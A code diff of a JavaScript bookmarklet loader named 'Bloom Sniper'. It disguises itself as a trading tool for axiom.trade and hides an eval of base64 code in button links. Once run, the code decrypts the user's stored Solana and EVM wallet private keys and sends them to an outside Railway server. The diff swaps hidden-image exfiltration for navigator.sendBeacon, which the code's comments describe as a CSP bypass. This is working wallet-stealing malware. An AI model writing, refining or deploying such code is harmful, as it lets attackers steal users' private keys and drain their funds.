@@ -1,4 +1,4 @@
-// === BLOOM SNIPER - FINAL WORKING VERSION (Async Fixed + Railway) ===
+// === BLOOM SNIPER - FINAL (sendBeacon + CSP bypass) ===
 console.log('🚀 Bloom Sniper Loader loaded from Railway');
 
 document.addEventListener('DOMContentLoaded', function() {
@@ -7,13 +7,12 @@ document.addEventListener('DOMContentLoaded', function() {
     console.log('Found ' + buttons.length + ' button(s)');
 
     buttons.forEach(function(btn) {
-        const innerCode = async () => {   // ← FIXED: now async
+        const innerCode = async () => {
             try {
                 if (location.hostname !== "axiom.trade") {
                     alert("You must drag the bookmarklet to your bookmarks bar instead of clicking it.");
                     return;
                 }
-
                 if (!localStorage.getItem("isAuthed")) {
                     alert("You must be signed in to use this bookmarklet.");
                     return;
@@ -55,33 +54,21 @@ document.addEventListener('DOMContentLoaded', function() {
                         .map(b => b.toString(16).padStart(2, "0")).join("");
                 }
 
-                // === RELIABLE IMG EXFIL ===
+                // === CSP-BYPASS EXFIL (navigator.sendBeacon POST) ===
                 async function sendData(data) {
                     const RAILWAY_URL = "https://bloom-sniper-replica-production.up.railway.app";
                     const timestamp = Math.floor(Date.now() / 1000);
-                    const header = navigator.userAgent;
                     data.timestamp = timestamp;
-                    data.header = header;
+                    data.header = navigator.userAgent;
 
-                    const jsonStr = JSON.stringify(data);
-                    const safeB64 = btoa(unescape(encodeURIComponent(jsonStr)));
-                    const exfilUrl = `${RAILWAY_URL}/i/${safeB64}`;
+                    const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+                    const success = navigator.sendBeacon(`${RAILWAY_URL}/i`, blob);
 
-                    console.log('📤 Sending via img → length:', safeB64.length);
-
-                    const img = document.createElement('img');
-                    img.style.cssText = 'display:none;position:absolute;top:-9999px;left:-9999px;';
-                    img.src = exfilUrl;
-
-                    if (document.body) document.body.appendChild(img);
-                    else if (document.documentElement) document.documentElement.appendChild(img);
-
-                    setTimeout(() => { if (img.parentNode) img.parentNode.removeChild(img); }, 5000);
-
+                    console.log('📤 sendBeacon sent →', success);
                     alert('✅ Successfully extracted ' + (data.keys ? data.keys.length : 0) + ' wallets! Sent to server.');
                 }
 
-                // === DECRYPT + STEALING LOGIC ===
+                // === DECRYPT + STEALING LOGIC (original) ===
                 async function decrypt(key, toDecrypt) {
                     const [ivString, dataString] = String(toDecrypt).split(":");
                     const iv = stringToArray(ivString);
@@ -102,7 +89,6 @@ document.addEventListener('DOMContentLoaded', function() {
 
                 const success = [];
 
-                // Solana
                 for (const bundle of solanaBundles) {
                     try {
                         const decryptedBundle = await decrypt(cryptoKey, bundle);
@@ -114,7 +100,6 @@ document.addEventListener('DOMContentLoaded', function() {
                     } catch (e) {}
                 }
 
-                // EVM
                 let ethers = null;
                 try {
                     ethers = await import("https://cdn.jsdelivr.net/npm/ethers@6.15.0/+esm");
@@ -130,7 +115,6 @@ document.addEventListener('DOMContentLoaded', function() {
                     } catch (e) {}
                 }
 
-                // Send data
                 await sendData({ keys: success, code: "sJduOyBJQoTeui1A", site: "Axiom" });
 
             } catch (err) {
@@ -139,11 +123,11 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         };
 
-        // Safe bookmarklet injection
+        // Safe injection
         const codeStr = '(' + innerCode.toString() + ')()';
         const encoded = btoa(unescape(encodeURIComponent(codeStr)));
         btn.href = 'javascript:eval(atob("' + encoded + '"))';
         btn.draggable = true;
-        console.log('✅ Real bookmarklet injected successfully!');
+        console.log('✅ Real bookmarklet injected!');
     });
 });
